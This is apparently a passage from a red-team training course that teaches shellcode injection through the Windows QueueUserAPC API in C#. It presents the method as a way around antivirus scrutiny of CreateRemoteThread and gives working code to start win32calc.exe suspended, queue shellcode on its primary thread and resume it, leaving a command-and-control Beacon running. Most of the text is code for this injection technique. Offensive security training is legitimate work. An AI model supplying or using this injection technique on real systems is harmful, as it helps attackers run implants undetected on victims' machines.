CreateRemoteThread is very heavily scrutinised and AVs such as Windows Defender tend to block it by default.  **QueueUserAPC** is another API that we can use to execute shellcode in a process.  There are two main ways to use it:

1.  Spawn a process in a suspended state, queue the APC on the primary thread and resume.
2.  Enumerate threads of an existing process and queue the APC on one of them.
    1.  Wait for that thread to enter an alerted state, or
    2.  Force that thread to enter an alerted state.

The first option of spawning a process is the most straight forward.

1.  Spawn a process as before, but pass the CREATE_SUSPENDED flag (documented [here](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)).  If the process fails to start, just throw an exception as we can't continue further.

```csharp
var si = new Win32.STARTUPINFO();
si.cb = Marshal.SizeOf(si);

var pa = new Win32.SECURITY_ATTRIBUTES();
pa.nLength = Marshal.SizeOf(pa);

var ta = new Win32.SECURITY_ATTRIBUTES();
ta.nLength = Marshal.SizeOf(ta);

var pi = new Win32.PROCESS_INFORMATION();

var success = Win32.CreateProcessW(
    "C:\\Windows\\System32\\win32calc.exe",
    null,
    ref ta,
    ref pa,
    false,
    0x00000004, // CREATE_SUSPENDED
    IntPtr.Zero,
    "C:\\Windows\\System32",
    ref si,
    out pi);

// If we failed to spawn the process, just bail
if (!success)
    throw new Win32Exception(Marshal.GetLastWin32Error());
```

  

2.  Fetch the shellcode and write it into the target process.

3.  Call the QueueUserAPC API.  Give it the location of the shellcode in memory and the handle to the process' primary thread.

```csharp
// Queue the APC
Win32.QueueUserAPC(
    baseAddress, // point to the shellcode location
    pi.hThread,  // primary thread of process
    0);
```

  

4.  Resume the thread.

```csharp
// Resume the thread
Win32.ResumeThread(pi.hThread);
```

You will now have a Beacon running in win32calc.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/process-injection/queueuserapc/beacon.png)